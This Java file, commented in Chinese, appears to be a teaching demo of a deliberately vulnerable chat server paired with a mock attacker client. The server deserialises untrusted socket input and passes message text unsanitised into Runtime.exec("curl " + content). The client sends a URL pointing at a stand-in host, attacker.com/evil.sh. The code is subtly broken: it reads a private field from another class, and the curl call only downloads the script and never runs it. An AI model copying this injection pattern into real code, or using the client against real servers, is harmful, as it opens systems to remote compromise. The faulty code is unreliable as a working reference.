import java.io.*;
import java.net.*;
import java.util.*;

// 聊天消息类
class ChatMessage implements Serializable {
    private String content;
    private String sender;
    private String receiver;
    
    public ChatMessage(String content, String sender, String receiver) {
        this.content = content;
        this.sender = sender;
        this.receiver = receiver;
    }
    
    @Override
    public String toString() {
        return "[" + sender + "]->(" + receiver + "): " + content;
    }
}

// 漏洞存在的聊天服务器
class ChatServer {
    private static List<ChatMessage> messageHistory = new ArrayList<>();
    
    public static void main(String[] args) {
        try (ServerSocket serverSocket = new ServerSocket(8080)) {
            System.out.println("Chat Server started on port 8080");
            
            while (true) {
                Socket socket = serverSocket.accept();
                handleClient(socket);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private static void handleClient(Socket socket) {
        try (ObjectInputStream ois = new ObjectInputStream(socket.getInputStream())) {
            // 不安全的反序列化操作
            Object obj = ois.readObject();
            
            if (obj instanceof ChatMessage) {
                ChatMessage message = (ChatMessage) obj;
                messageHistory.add(message);
                System.out.println("Received message: " + message);
                
                // 模拟消息处理逻辑
                processMessage(message);
            }
        } catch (Exception e) {
            System.err.println("Error handling client: " + e.getMessage());
        }
    }
    
    private static void processMessage(ChatMessage message) {
        // 模拟消息处理
        if (message.content.contains("http")) {
            System.out.println("Auto-downloading attachment from: " + message.content);
            // 模拟下载处理
            try {
                Runtime.getRuntime().exec("curl " + message.content);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}

// 模拟攻击者客户端
class AttackerClient {
    public static void main(String[] args) {
        try {
            Socket socket = new Socket("localhost", 8080);
            ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
            
            // 构造恶意对象（示例：通过消息内容执行命令）
            ChatMessage evilMessage = new ChatMessage("http://attacker.com/evil.sh", "hacker", "admin");
            oos.writeObject(evilMessage);
            oos.flush();
            
            System.out.println("Sent malicious message!");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}